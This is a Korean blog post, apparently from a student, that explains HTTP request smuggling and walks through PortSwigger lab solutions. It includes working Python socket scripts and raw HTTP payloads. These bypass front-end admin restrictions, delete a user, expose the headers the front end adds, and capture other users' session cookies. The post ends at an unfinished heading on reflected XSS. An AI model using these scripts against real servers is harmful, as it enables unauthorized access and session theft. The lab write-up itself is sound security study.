---
layout: post
title:  "HTTP Request Smuggling Attack "
date:   2020-11-07
categories: ["2020","web hacking"]
update: 2020-11-12
tags: [web]
---

시험기간 + 다른 할일이 겹쳐 오래 글을 못 썼는데, 이번에 동아리+학부 차원에서 CTF를 열었다가 친구 문제에서 배울 게 있어서 정리도 할겸 한번 써보겠습니다. 친구 문제의 시나리오는 다음과 같습니다.

- HTTP Smuggling + Django SSTI

or

- python urlparse의 취약점을 이용한 CSRF + Django SSTI

CSRF 는 다른 문제에서도 많이 공부할 수 있어서 간단히 취약점 링크만 남겨드리고, HTTP Smuggling attack이 뭔지, 예제를 풀어보면서 공부해보겠습니다.

> 🚀 [https://bugs.python.org/issue35748](https://bugs.python.org/issue35748)

## HTTP request smuggling

### 🤔 What is HTTP request smuggling? 

HTTP request smuggling 공격은 웹사이트에서 여러 유저들로부터 받은 요청을 처리하는 과정을 간섭해서, 공격자가 민감한 정보에 접근할 수 있게 하거나, 다른 사용자를 공격할 수 있게 하는 공격 방법입니다.

#### 🔍 What happens in an HTTP request smuggling attack?

최근 웹 어플리케이션들은 Back-end와 사용자 사이에 여러 HTTP 서버들을 두고 있습니다. 사용자가 Front-end 서버(로드 밸런서, 리버스 프록시로 불리기도 합니다.)에 요청을 보내면 그 서버가 요청을 Back-end로 포워드해주는 방식입니다. 

Front-end 서버가 HTTP 요청을 Back-end 서버로 포워드해줄 때,  성능을 위해 TCP, SSL/TLS 소켓하나로 여러개의 HTTP 요청을 전달합니다. 방법은 단순합니다 :

- HTTP 요청을 여러 개 보내면, 요청을 받는 서버는 HTTP 요청 헤더를 파싱해서 한 요청이 끝나는 부분과 다음 요청이 시작하는 부분을 결정합니다.

이런 상황에서는, Front-end와 Back-end가 요청의 범위를 정하는 방식이 같아야 합니다. 그렇지 않으면, 공격자가 Front-end와 Back-end가 요청을 해석하는 방식의 차이를 이용해서 공격을 수행할 수도 있습니다.

![](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)

위 사진에서 공격자가 Back-end가 Front-end의 요청 중 일부를 다음 요청의 시작으로 인식하게 만들고, 이는 다음 요청의 시작 부분에 붙어서 해석되기 때문에 어플리케이션이 원치 않는 동작을 할 수 있습니다.

#### 👀 How do HTTP request smugglin vulnerabilities arise?

 대부분 HTTP request smuggling 취약점은 [HTTP 명세](https://tools.ietf.org/html/rfc2616#section-4.4)를 확인해보면, 요청의 끝을 정하는 방식이 두 가지가 있기 때문에 발생합니다: 하나는 `Content-Length` 헤더를 보고, 하나는 `Transfer-Encoding` 헤더를 보고 결정하는 방식입니다.

`Content-Length` 헤더는 말 그대로 body의 byte 길이를 정의합니다 : 

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling # 길이 11
```

`Transfer-Encoding` 헤더는 body가 chunked encoding을 사용하고 있는지 확인하는 헤더입니다. 이 말은 body가 하나 이상의 data chunk를 가지고 있다는 말입니다. 각 chunk는 `16진수로 표현된 chunk size+\r\n+chunk content`로 구성됩니다. 메세지는 zero 사이즈의 chunk로 끝이 납니다 :

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b # 11
q=smuggling # 길이 11
0

```

 두 가지 방법으로 body의 길이를 정할 수 있기 때문에, 한 요청이 두 방법 모두를 사용하게 할 수 있습니다.  위에서 언급한 HTTP 명세에서는 만약 두 헤더가 둘 다 있으면, `Content-Length`가 무시되어야 한다고 하고 있습니다. 만약 한 서버만 사용하고 있으면 이것만으로도 충분히 문제를 해결할 수 있지만, 여러 서버를 사용하고 있으면 이 방법만으로는 충분하지 않습니다 :

- 어떤 서버는 `Transfer-Encoding` 헤더를 지원하지 않습니다.
- `Transfer-Encoding`을 지원하는 서버도, 헤더가 조작되면 그 헤더를 처리하지 않을 수 있습니다.

Front-end 서버와 Back-end 서버가 `Transfer-Encoding` 헤더를 만났을 때 다르게 동작하면, 요청의 범위에 대해서도 다르게 정의할 수 있습니다. 이런 불일치가 **HTTP request smuggling** 공격으로 이어질 수 있습니다.

### 😃 How to perform an HTTP request smuggling attack 

HTTP request smuggling 공격은 `Content-Length`와 `Transfer-Encoding` 헤더를 둘 다 요청에 포함시켜서, Front-end와 Back-end가 요청을 다르게 해석하게 합니다. 공격이 성공하려면 두 서버가 헤더에 대해 어떻게 동작하는 지에 따라 다릅니다 :

`CL` : Content-Length, `TE` : Transfer-Encoding

- `CL.TE` : Front-end 서버는 `Content-Length`를 사용하고, Back-end 서버는 `Trasnfer-Encoding`을 사용하는 경우
- `TE.CL` : 위와 반대
- `TE.TE` : Front-end 서버와 Back-end 서버가 둘다 `Transfer-Encoding` 헤더를 지원하지만, 한 서버는 헤더를 조작해서 헤더를 처리하지 않게 할 수 있는 경우

#### CL.TE vulnerabilities

Front-end 서버는 `Content-Length`를 사용하고 Back-end 서버는 `Transfer-Encoding`를 사용하는 경우입니다. HTTP request smuggling 공격에 쓰이는 페이로드는 다음과 같습니다 :

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED # 0\r\n+\r\n+SMUGGLED = 13
```

Front-end 서버는 `Content-Length` 헤더를 보고 요청 body의 byte 길이가 13이라고 결정합니다. 그리고 이 요청을 Back-end 서버에게 포워드합니다.

Back-end 서버는 `Transfer-Encoding`헤더를 보고 body를 chunked encoding을 사용한 것으로 이해합니다. 그리고 zero size의 chunk를 처리하고, 이 chunk가 요청의 마지막이라고 인식합니다. 그래서 뒤에 `SMUGGLED`는 처리되지 않은 채로 남아있고, Back-end 서버가 이 문자열을 다음 요청의 시작으로 사용합니다.

예제를 하나 풀어보겠습니다 :

**LAB: HTTP request smuggling, basic CL.TE vulnerability**  

**LAB Description :**

이 Lab은 chunked encoding을 지원하지 않는 Front-end 서버와, 지원하는 Back-end 서버로 이루어져 있습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.

이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.

**PAYLOAD :**

```python
import socket
import requests
import ssl

HOST = "ac431f3f1ec6d7438018a64c00cb008d.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b''

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: ac431f3f1ec6d7438018a64c00cb008d.web-security-academy.net\r\n'
first_request += b'Content-Length: '+str(len(second_request)+6).encode()+b'\r\n'
first_request += b'Connection: keep-alive\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += b'0\r\n\r\n'
first_request += b'G'


smuggle_request = first_request + second_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

위 페이로드를 두 번 보내면 두 번째 요청에는 백엔드에서 처리하지 않은 `G`가 붙어서 `GPOST / HTTP/1.1`로 요청하게 됩니다.

과정을 조금 자세히 보면 다음과 같습니다 : 

- Front-end 서버에서 `Content-Length`를 보고 요청을 처리하기 때문에, `G` 까지 포함해서 Back-end에 전달합니다.
- Back-end 서버에서는 `Transfer-Encoding`을 보고 처리하기 때문에, `0\r\n\r\n`, 즉 zero size의 청크를 보고 요청의 끝으로 인식합니다.
- 처리되지 않은 `G`는 Back-end에서 대기하다가 다음 요청이 들어오면 그 요청 앞에 붙어서 처리됩니다. 

 **Response :**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

#### TE.CL vulnerabilities

이번에는 Front-end 서버가 `Transfer-Encoding` 헤더를 사용하고, Back-end 서버는 `Content-Length`를 사용하는 경우입니다. 페이로드는 다음과 같습니다 : 

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

 **NOTE :** 위 예제에서도 그렇지만, `chunk size 0 +\r\n+chunk(nothing)\r\n`이기 때문에  0 뒤에는 항상 `\r\n\r\n`이 붙어야 합니다.

Front-end 서버는 `Transfer-Encoding` 헤더를 처리하기 때문에 body를 chunked encoding으로 인식합니다. 그래서 첫번째 chunk(`8 + \r\n + SMUGGLED + \r\n`)을 처리합니다. 그리고 zero size의 chunk를 보고 요청의 끝임을 확인합니다. 

Back-end 서버에서는 `Content-Length`를 보고 처리하기 때문에 `8 +\r\n` 까지만 처리하고, 나머지 부분은 처리되지 않은 상태로 남아있게 됩니다. 그리고 남은 부분은, 다음 요청이 들어왔을 때 그 요청 앞에 붙어서 처리됩니다.

이 것도 예제를 풀어보겠습니다 :

**LAB : HTTP request smuggling, basic TE.CL vulnerability**

**LAB Description :**

이 문제는 Front-end와 Back-end 서버로 이루어져 있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.

이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "ac051ff81f715a8e8012640a002d00f9.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'GPOST / HTTP/1.1\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'Content-Length: 10\r\n'
second_request += b'\r\n'
second_request += b'x=1'

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: 4\r\n'
first_request += b'Connection: keep-alive\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += hex(len(second_request))[2:].encode()+b'\r\n'
first_request += second_request
first_request += b'\r\n'
first_request += b'0\r\n\r\n'


smuggle_request = first_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

Front-end 서버에서 `Transfer-Encoding`을 확인하고 Back-end에서 `Content-Length`를 확인하기 때문에, `0\r\n\r\n`까지 보내놓고, `Content-Length`로 원하는 부분까지 잘라서 사용하면 됩니다. 

`GPOST`로 요청을 보내야하기 때문에 `GPOST` 메소드를 사용하는 요청 하나를 chunk로 만들어 놓고, Back-end에서 처리할 때 그 전까지만 사용하면, `GPOST / HTTP/1.1` 이후는 사용되지 않고 남아있기 때문에 다음 요청의 앞부분에 붙게 됩니다.

**Response :**

``` http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

#### TE.TE behavior: obfuscating the TE header

이 경우는 Front-end와 Back-end 모두 `Transfer-Encoding` 헤더를 지원하지만, 서버 하나는 헤더의 조작을 통해 헤더를 인식하지 못하게 할 수 있는 경우 입니다.

`Transfer-Encoding` 헤더를 조작하는 방법은 끝이 없습니다. 예시는 다음과 같습니다.

```
Transfer-Encoding: xchunked

Transfer-Encoding : xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: [tab]chunked
[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding: 
chunked
```

리얼 월드에서는 프로토콜을 사용할 때 명세에서 시키는대로 정확히 사용하지 않습니다. 때문에 약간씩 다른식으로 동작하는 것은 자주 있는 일입니다. **TE.TE 취약점**을 발견하기 위해서는, `Transfer-Encoding` 헤더를 변형시켜가면서 어떤 경우에 Front-end와 Back-end가 다르게 동작하는지 알아내야 합니다. 

`Transfer-Encoding` 헤더를 처리하지 못하는 쪽이 Front-end인지, Back-end 쪽인지에 따라 공격 방식이 각각 **CL.TE** , **TE.CL**와 비슷해집니다.

예제를 풀어봅시다.

**LAB: HTTP request smuggling, obfuscating the TE header**

**LAB Description :**

이 문제는 Front-end와 Back-end 서버로 이루어져 있습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.

이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "ac3e1f471eb92269807ae90a007a0066.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'GPOST / HTTP/1.1\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'Content-Length: 10\r\n'
second_request += b'\r\n'
second_request += b'x=1'

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: 4\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'Transfer-Encoding: x\r\n'
first_request += b'\r\n'
first_request += hex(len(second_request))[2:].encode()+b'\r\n'
first_request += second_request
first_request += b'\r\n'
first_request += b'0\r\n\r\n'


smuggle_request = first_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

공격 방법은 위의 예제와 동일하지만, 이 취약점을 발견하는 데 좀 더 시간이 걸립니다. `Transfer-Encoding`를 조작해보고, **CL.TE**로 작동하는지, **TE.CL**로 작동하는지도 확인해봐야 합니다.

**Response :**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```



**HTTP request smuggling** 공격에 대해 알아보고 기본적인 공격방벙을 공부했는데, 좀 더 많은 문제를 풀어보고 싶으시면 링크 남겨드릴테니 풀어보시면 될 것 같습니다. **HTTP request smuggling** 공격에 대한 문제가 많지 않았던 거 같은데 여기서 공부하면 좋을 것 같습니다. :

> 🚀 [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)

## Exploiting HTTP request smuggling vulnerabilities

위에서는 개념과 간단한 공격에 대해서 공부했으니 이번에는 실제 여러 문제를 풀어보도록 하겠습니다. 

### 😎 Using HTTP request smuggling to bypass front-end security controls

어떤 어플리케이션들은 Front-end 서버에서 사용자의 요청이 악의적인 요청인지  검사하게 합니다. 요청이 검사를 통과하면 그 요청을 Back-end 서버로 포워드 해줍니다. 그럼 Back-end에서는 검사를 통과한 요청으로 인식하고, 요청을 처리합니다.

접근 통제를 구현한 어플리케이션에서 권한이 없는 사용자는 `/home` 에는 접근할 수 있지만 `/admin`에는 접근할 수 없다고 가정해봅시다. 이런 경우 **HTTP request smuggling** 공격을 사용하면 권한이 없는 사용자도 `/admin` 경로에 접근할 수 있습니다 :

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

이 경우는 **CL.TE** 취약점이 발생한 경우입니다. Front-end에서는 `Content-Length` 헤더를 보고 요청을 모두 Back-end에게 포워드 해주고, Back-end에서는 `Transfer-Encoding` 헤더를 보고 `0\r\n\r\n`까지 처리합니다. 남은 부분은 처리되지 않은 상태로 남아있고, 다음 요청이 들어오면 그 요청 앞에 붙어서 처리됩니다.

**Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**

**LAB Description :**

Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. `/admin`에 어드민 패널이 있고 Front-end 서버는 어드민이 아닌 사용자의 요청을 막습니다.

이 문제를 풀려면 어드민 패널에 접근하는 요청을 smuggle 해서 `carlos` 사용자를 삭제하면 됩니다.

**PAYLOAD :**

``` python
second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
second_request += b'Host: localhost\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'Content-Length: 10\r\n'
second_request += b'\r\n'
second_request += b'x='

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += b'0\r\n\r\n'

smuggle_request = first_request + second_request
```

- `Admin interface only available to local users` 에러가 떠서 `Host: localhost`로 지정해줬습니다.

- `Host` 헤더를 따로 지정해주니까 원래 붙는 `Host`와 중복되서 자꾸 400 에러가 뜹니다. 그래서 `\r\n`를 삽입해줘서 원래의 요청이 body가 되게 해줬습니다.

`/admin`에 접근했다면 `delete`의 경로를 알 수 있고 그 경로로 요청을 보내면 됩니다.

**Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**

**LAB Description :**

Front-end, Back-end 서버로 이루어져있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. `/admin`에 어드민 패널이 있고 Front-end 서버는 어드민이 아닌 사용자의 요청을 막습니다.

이 문제를 풀려면 어드민 패널에 접근하는 요청을 smuggle 해서 `carlos` 사용자를 삭제하면 됩니다.

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "ac4c1f991e8b814281d118c900760051.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
second_request += b'Host: localhost\r\n'

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: 4\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += hex(len(second_request))[2:].encode()+b'\r\n'
first_request += second_request
first_request += b'\r\n'
first_request += b'0\r\n\r\n'


smuggle_request = first_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

위에서 풀었던 문제들과 비슷하게 풀면 됩니다.

### 😎 Revealing front-end request rewriting

많은 어플리케이션들에서 Front-end 서버는 원래 요청이 Back-end로 포워드되기 전에 요청을 수정해서 Back-end에게 전달합니다. 예를 들어, Front-end 서버는 원래 요청에 다음과 같은 일을 할 수 있습니다 :

- TLS 연결을 끊고, 사용된 프로토콜과 암호를 설명하는 헤더를 추가합니다.
- `X-Forwarded-For` 헤더를 추가해서 사용자의 ip를 표시합니다.
- session 토큰을 기반으로 사용자를 확인하고, 사용자를 식별할 수 있는 헤더를 추가합니다.
- 또는 다른 공격에 필요한 민감한 정보를 포함할 수도 있습니다.

만약 smuggle 된 요청이 Front-end 서버가 추가하는 헤더를 포함하지 않으면, Back-end 서버는 요청을 제대로 처리하지 않습니다. 

Front-end 서버가 요청을 어떻게 수정하는지 확인할 수 있는 방법이 있는데, 다음과 같은 단계를 따라야 합니다.

- 요청의 파라미터 중에, 그 값이 응답에 포함되는 POST 요청을 찾아야 합니다.
- 파라미터의 순서를 바꿔서, 응답에 포함되는 파라미터 값이 body에 제일 마지막에 나타나게 해야 합니다.
- 공격자가 확인하고 싶은 Front-end 서버로부터 수정된 요청 앞에 이 요청을 붙입니다.

로그인할 때 `email` 파라미터의 값을 응답에 포함하는 어플리케이션을 생각해봅시다.

``` http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

 이 요청은 다음의 값을 포함하는 응답을 만들어 냅니다 :

``` html
<input id="email" value="wiener@normal-user.net" type="text">
```

그래서 다음과 같은 요청을 사용해서 Front-end 서버가 수정한 요청을 확인할 수 있습니다.

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

이렇게 되면 Front-end가 수정한 정상적인 요청이 `email`의 값으로 여겨져서 응답에서 수정된 요청을 확인할 수 있습니다.

``` html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

**NOTE :** 마지막 요청이 Front-end 서버에 의해 수정되기 때문에 길이가 얼마나 될 지 알 수가 없습니다. smuggled된 요청의  `Content-Length` 헤더의 값이 요청의 길이가 얼마인지 결정하게 됩니다. 그래서 만약 `Content-Length`의 값이 너무 작으면, 요청 중 일부만 받을 수 있고, `Content-Length`의 값이 크면, time-out 에러가 뜰 것입니다. 이 값을 수정해가면서 공격을 진행하면 됩니다.

Front-end 서버가 요청을 어떻게 수정하는지 알았다면, 필요한 사항들을 smuggle 될 요청에 추가합니다. 그러면 Back-end 서버에서도 정상적으로 그 요청을 처리할 수 있습니다.

**Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting**

**LAB Description :**

Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 

`/admin` 에 어드민 패널이 있고 IP 127.0.0.1로부터만 접근이 가능합니다. Front-end 서버는 요청에 IP 주소를 포함한 헤더를 추가합니다.

Front-end 서버가 추가하는 헤더를 알기 위해 HTTP request smuggling 공격을 사용하고, 어드민 패널에 접근해서 `carlos` 유저를 삭제하면 됩니다.

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "acc31f021f30ed03804c217e00c8001a.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'X-erdsHb-Ip: 127.0.0.1\r\n'
second_request += b'Host: '+HOST.encode()+b'\r\n'
second_request += b'Content-Length: 100\r\n'
second_request += b'\r\n'
second_request += b'search='

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
#first_request += b'\r\n'
#first_request += hex(len(second_request))[2:].encode()+b'\r\n'
#first_request += second_request
first_request += b'\r\n'
first_request += b'0\r\n\r\n'


smuggle_request = first_request + second_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

`search` 파라미터의 값이 응답에 그대로 표시되기 때문에, `search` 로 Front-end가 추가한 헤더를 알아내고, 이 헤더의 값을 `127.0.0.1`로 바꾸면 됩니다.

### 😎 Capturing other users' requests

어플리케이션이 텍스트로 된 데이터를 저장하고 다운로드할 수 있는 기능을 지원하는 경우, **HTTP request smuggling** 공겨을 사용해서 다른 사용자들의 요청의 내용을 가져올 수 있습니다. session 토큰을 포함할 수도 있고, session 하이재킹 공격을 가능하게 할 수 있고, 또 다른 사용자로가 사용한 민감한 정보를 포함할 수도 있습니다. 댓글, 이메일, 프로필 설명 같은 기능들이 주로 이 공격을 수행하는데 자주 사용됩니다.

이 공격을 수행하려면 데이터 저장 기능에 보내는 요청을 smuggle 할 수 있어야 합니다. Back-end가 정상적으로 처리해야 하는 다음 요청이 smuggle된 요청 뒤에 붙어서, 다른 사용자의 요청 내용이 raw text로 저장됩니다.

블로그에 댓글을 다는 요청을 예로 들어 봅시다. 이 요청의 결과는 블로그에 나타납니다 :

``` http  
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

다음과 같은 요청을 보내서 **HTTP request smuggling** 공격을 수행할 수 있습니다 :

``` http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

다른 사용자의 요청이 Back-end 서버에 의해 처리될 때, 그 요청은 smuggle된 요청에 붙게 되고 다른 사용자의 요청이 text로 저장됩니다. 사용자의 요청에는 민감한 정보가 포함되어 있을 수도 있습니다 : 

``` http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

**NOTE :** 이 공격방법에는 한계가 있는데, 파라미터 구분자를 만나기 전까지의 정보만 얻을 수 있다는 것입니다. 만약 `GET` 메소드를 사용하는 요청에서 URL에 `&`를 포함하고 있으면, 필요한 정보들을 얻을 수 없을 수도 있습니다.

**Lab: Exploiting HTTP request smuggling to capture other users' requests**

**LAB Description :**

Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. 

다음 사용자의 요청이 어플리케이션에 저장되게 한 다음, 그 사용자의 쿠키를 이용해 접속하면 됩니다. 

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "ac071f081f905a1b81bf42e30005007d.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'POST /post/comment HTTP/1.1\r\n'
second_request += b'Host: '+HOST.encode()+b'\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'Content-Length: 830\r\n'
second_request += b'Cookie: session=AGCd8ZxgfKGUA6th5RrmtM0AaZMeI6MI\r\n'
second_request += b'\r\n'
second_request += b'csrf=erlGB3vcRvPzF0zS6dMCZpCHNdhA5aF1&postId=1&name=jjjj&email=airmancho@kaa.com&website=http://blog.bbangjo.xyz&comment=123\r\n'

first_request_body = b'7d\r\n'
first_request_body += b'csrf=erlGB3vcRvPzF0zS6dMCZpCHNdhA5aF1&postId=1&name=first&email=first@aaaaa.com&website=http://blog.bbangjo.xyz&comment=first\r\n'
first_request_body += b'0\r\n\r\n'

first_request_header  = b'POST /post/comment HTTP/1.1\r\n'
first_request_header += b'Host: '+HOST.encode()+b'\r\n'
first_request_header += b'Content-Length: '+str(len(second_request)+len(first_request_body)).encode()+b'\r\n'
first_request_header += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request_header += b'Cookie: session=AGCd8ZxgfKGUA6th5RrmtM0AaZMeI6MI\r\n'
first_request_header += b'Transfer-Encoding: chunked\r\n'


smuggle_request = first_request_header + b'\r\n' + first_request_body + second_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```



![image](https://user-images.githubusercontent.com/51329156/98478034-145cb680-223a-11eb-8e02-c4e1bf3ac6b5.png)

BOT이 어떤 주기로 요청을 보내는지 몰라서 고생했습니다..

### 😎 Using HTTP request smuggling to exploit reflected XSS

